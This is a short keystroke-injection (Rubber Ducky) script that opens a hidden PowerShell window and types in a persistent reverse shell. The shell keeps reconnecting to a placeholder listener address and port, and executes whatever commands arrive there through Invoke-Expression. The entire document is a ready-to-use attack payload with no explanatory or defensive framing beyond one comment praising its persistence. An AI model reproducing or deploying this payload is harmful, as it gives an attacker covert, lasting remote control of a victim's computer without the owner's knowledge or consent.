GUI r
DELAY 500
STRING powershell.exe -windowstyle hidden
DELAY 200
ENTER
DELAY 3000 
REM This script ensures persistent connection and allows reconnection.
STRING while ($true) { do { Start-Sleep -Seconds 1; try { $TCPClient = New-Object Net.Sockets.TCPClient('LISTENER_IP_MACHINE', PORT) } catch {} } until ($TCPClient.Connected); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream ($String) { $prompt = "$($PWD.Path)> "; [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; $StreamWriter.Write($String + $prompt); $StreamWriter.Flush() }; WriteToStream ''; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); if ($Command -eq "exit") { break }; $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String }; WriteToStream ($Output) }; $StreamWriter.Close() }
ENTER
